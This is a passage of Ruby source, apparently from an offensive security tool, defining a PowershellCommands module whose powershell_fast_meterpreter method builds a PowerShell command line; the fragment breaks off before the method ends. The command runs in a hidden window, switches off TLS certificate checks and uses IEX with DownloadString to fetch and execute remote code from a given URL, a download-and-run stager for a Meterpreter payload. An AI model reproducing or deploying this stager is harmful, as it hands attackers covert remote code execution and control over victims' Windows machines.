...
module PowershellCommands
  def powershell_fast_meterpreter(url)
    powershell_command = %(powershell -windowstyle hidden "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('#{url}'))
